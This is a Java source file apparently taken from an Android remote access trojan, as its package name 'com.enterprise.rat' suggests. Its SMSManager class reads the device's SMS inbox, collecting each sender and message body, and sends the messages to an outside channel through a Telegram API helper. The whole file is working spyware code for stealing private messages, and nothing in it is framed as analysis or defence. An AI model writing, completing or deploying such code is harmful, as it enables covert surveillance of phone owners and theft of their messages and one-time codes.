package com.enterprise.rat.commands;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.enterprise.rat.utils.TelegramApi;

public class SMSManager {
    private Context context;

    public SMSManager(Context context) { this.context = context; }

    public void sendSMSList(int limit) {
        StringBuilder sb = new StringBuilder("<b>📩 Last " + limit + " SMS:</b>\n\n");
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");

        if (cursor != null && cursor.moveToFirst()) {
            int count = 0;
            do {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                sb.append("<b>From:</b> <code>").append(address).append("</code>\n")
                  .append("<b>Msg:</b> ").append(body).append("\n\n");
                count++;
            } while (cursor.moveToNext() && count < limit);
            cursor.close();
            TelegramApi.sendMessage(sb.toString());
        } else {
            TelegramApi.sendMessage("❌ No SMS found.");
        }
    }
}
